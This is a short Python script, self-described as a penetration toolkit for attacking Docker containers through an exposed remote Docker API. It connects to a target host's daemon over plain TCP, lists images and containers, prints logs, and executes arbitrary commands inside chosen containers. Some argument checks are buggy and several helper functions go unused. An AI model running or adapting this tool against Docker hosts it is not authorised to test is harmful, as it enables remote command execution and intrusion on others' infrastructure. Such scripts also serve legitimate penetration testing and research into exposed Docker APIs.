#!/usr/bin/env python3
import docker
import argparse

def print_logs_from_container(id):
    container = client.containers.get(id)
    print(container.logs())

def stop_all_containers():
    for container in client.containers.list():
        container.stop()

def stop_container(id):
    container = client.containers.get(id)
    container.stop()

def start_container(name):
    client.containers.run("alpine", ["echo", "hello", "world"])

def list_containers():
    if client.containers.list():
        print('')
        print('Container name/id')
        for container in client.containers.list():
            print('{0}/{1}'.format(container.name,container.id))
    else:
        print('System does not contain any containers')

def list_images():
    if client.images.list():
        print('Images Available')
        for c in client.images.list():
            for tag in c.tags:
                print(tag)
    else:
        print('System does not contain any containers')

def execute_command_in_container(container_name,command):
        container = client.containers.get(container_name)
        print(container.exec_run(command))

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Penetration Toolkit for attacking Docker containers via the API')
    subparsers = parser.add_subparsers(title='Exec subcommands',
                                       description='requirements for executing commands in contrainers')
    parser.add_argument('-H','--host', required=True, type=str, help='IP or hostname of system running Docker API')
    parser.add_argument('-p','--port', default=4243, type=str, help='HTTPS port of the Docker API. Defaults to 4243')
    #parser.add_argument('-s','--tls', type=str, help='HTTPS port of the Docker API. Defaults to 4243')

    enum_parser = subparsers.add_parser('enum', help='Enumeration Commands')
    enum_parser.add_argument('--images', action='count', help='Lists the Images available to Docker',default=0)
    enum_parser.add_argument('--containers', action='count', help='Lists the Images available to Docker',default=0)


    exec_parser = subparsers.add_parser('exec', help='Command execution options')
    exec_parser.add_argument('--id', help='Container id to execute command on')
    exec_parser.add_argument('--command', help='Command to execute within container')
    exec_parser.add_argument('--logs', help='Print logs from container')

    parser.set_defaults()
    args = parser.parse_args()

    # Initializes Docker Client API
    client = docker.DockerClient(base_url='tcp://{0}:{1}'.format(args.host,str(args.port)))

    if 'images' in args:
        list_images()
    if 'containers' in args:
        list_containers()
    if 'command' in args:
        command = args.command.strip("'")
        execute_command_in_container(args.id,args.command)
    if 'logs' in args:
        print_logs_from_container(args.id)



